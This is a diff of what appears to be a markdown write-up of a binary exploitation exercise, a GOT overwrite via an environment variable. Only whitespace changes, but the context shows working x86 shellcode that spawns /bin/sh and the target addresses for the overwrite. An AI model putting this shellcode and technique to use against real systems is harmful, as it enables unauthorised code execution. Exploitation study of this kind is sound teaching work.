@@ -39,9 +39,9 @@ First we will inject a spawn shell code into an environment variable :
 
     export SHELLCODE="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
 
-Now let's get the location address of the .GOT exit table & previous ENV var :
+Now let's get the location address of the .GOT exit table & previous ENV var :  
 
-**.GOT** table addr : **`0x80497e0`**
-**ENV** var addr : **`0xffffd885`** / **`4294957189`**
-
+**.GOT** table addr : **`0x80497e0`**  
+**ENV** var addr : **`0xffffd885`** / **`4294957189`**  
+  
 We notice that the address of the ENV is a very large number, we will have to divide the overwrite operation into two parts.
